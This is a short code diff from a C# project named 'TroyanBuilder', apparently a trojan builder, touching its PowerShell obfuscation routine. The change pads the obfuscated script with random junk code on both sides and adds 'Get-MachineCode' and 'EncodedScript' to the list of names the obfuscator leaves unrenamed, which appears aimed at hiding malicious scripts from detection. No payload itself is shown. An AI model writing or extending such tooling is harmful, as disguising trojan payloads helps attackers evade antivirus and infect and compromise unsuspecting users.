@@ -12,6 +12,7 @@ namespace TroyanBuilder
         {
             var data  = File.ReadAllText(psScriptFile);
             data = Obfuscate(data);
+            data = RandomCode() + data + RandomCode();
             File.WriteAllText(psScriptFile, data);
         }
 
@@ -192,7 +193,7 @@ namespace TroyanBuilder
 
         private  List<string> Exclusions = new List<string>()
         {
-            "true", "false"
+            "true", "false","Get-MachineCode","EncodedScript"
         };
 
         private  VarInfo GetInfo(VariableExpressionAst variable, string scope)
